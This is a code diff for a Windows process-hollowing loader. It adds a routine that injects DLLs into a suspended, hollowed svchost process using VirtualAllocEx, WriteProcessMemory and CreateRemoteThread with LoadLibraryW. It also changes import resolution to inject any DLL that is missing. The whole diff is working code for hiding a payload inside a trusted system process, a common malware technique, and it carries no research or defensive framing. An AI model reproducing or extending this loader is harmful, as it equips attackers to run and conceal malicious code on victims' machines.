@@ -135,6 +135,39 @@ static LPVOID FindRemoteDllBase(HANDLE hProc, LPVOID remotePeb, const wchar_t* d
     return NULL;
 }
 
+// Load a DLL into the remote process when the suspended-and-hollowed svchost
+// doesn't have it mapped (only ntdll/kernel32/kernelbase are present after
+// CreateProcess(CREATE_SUSPENDED) — the loader hasn't run yet).
+// Uses CreateRemoteThread + kernel32!LoadLibraryW, then re-scans the PEB.
+// kernel32 is shared across processes at the same base (per-boot ASLR), so
+// LoadLibraryW's address is valid in the target host.
+static LPVOID LoadLibraryInRemote(HANDLE hProc, const wchar_t* dllName, LPVOID remotePeb) {
+    LPVOID base = FindRemoteDllBase(hProc, remotePeb, dllName);
+    if (base) return base;
+
+    size_t nameSize = (lstrlenW(dllName) + 1) * sizeof(wchar_t);
+    LPVOID remoteName = VirtualAllocEx(hProc, NULL, nameSize, MEM_COMMIT, PAGE_READWRITE);
+    if (!remoteName) return NULL;
+    SIZE_T written = 0;
+    WriteProcessMemory(hProc, remoteName, dllName, nameSize, &written);
+
+    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
+    LPTHREAD_START_ROUTINE pLoad = (LPTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryW");
+
+    LPVOID result = NULL;
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoad, remoteName, 0, NULL);
+    if (hThread) {
+        WaitForSingleObject(hThread, 5000);
+        DWORD ret = 0;
+        GetExitCodeThread(hThread, &ret);
+        CloseHandle(hThread);
+        result = FindRemoteDllBase(hProc, remotePeb, dllName);
+        if (!result && ret) result = (LPVOID)(ULONG_PTR)ret;
+    }
+    VirtualFreeEx(hProc, remoteName, 0, MEM_RELEASE);
+    return result;
+}
+
 // Find an exported function by name in a remote DLL.
 // Returns NULL if the export is forwarded (a known limitation — forwarded
 // exports need the forwarder DLL to be loaded and re-resolved, not in scope).
@@ -217,14 +250,24 @@ static BOOL ResolveImports(HANDLE hProc, LPVOID remoteImage, PIMAGE_NT_HEADERS n
 
         LPVOID remoteDllBase = FindRemoteDllBase(hProc, remotePeb, dllName);
         if (!remoteDllBase) {
-            wchar_t buf[256];
-            wsprintfW(buf, L"[-] IAT: DLL not in remote process: %s", dllName);
-            LogMessage(buf);
-            return FALSE;
+            // Suspended-and-hollowed svchost only has ntdll/kernel32/kernelbase
+            // mapped; the loader hasn't run. Inject the missing DLL by spawning
+            // a remote thread that calls kernel32!LoadLibraryW, then re-scan PEB.
+            wsprintfW(dbg, L"[*] IAT: %s not mapped — loading via remote thread", dllName);
+            LogMessage(dbg);
+            remoteDllBase = LoadLibraryInRemote(hProc, dllName, remotePeb);
+            if (!remoteDllBase) {
+                wchar_t buf[256];
+                wsprintfW(buf, L"[-] IAT: failed to load %s into remote process", dllName);
+                LogMessage(buf);
+                return FALSE;
+            }
+            wsprintfW(dbg, L"[+] IAT: %s loaded at %p", dllName, remoteDllBase);
+            LogMessage(dbg);
+        } else {
+            wsprintfW(dbg, L"[+] IAT: %s found at %p", dllName, remoteDllBase);
+            LogMessage(dbg);
         }
-
-        wsprintfW(dbg, L"[+] IAT: %s found at %p", dllName, remoteDllBase);
-        LogMessage(dbg);
 
         // ILT (OriginalFirstThunk) may be 0 in some PEs; fall back to IAT (FirstThunk).
         DWORD oltRva = import->OriginalFirstThunk ? import->OriginalFirstThunk : import->FirstThunk;
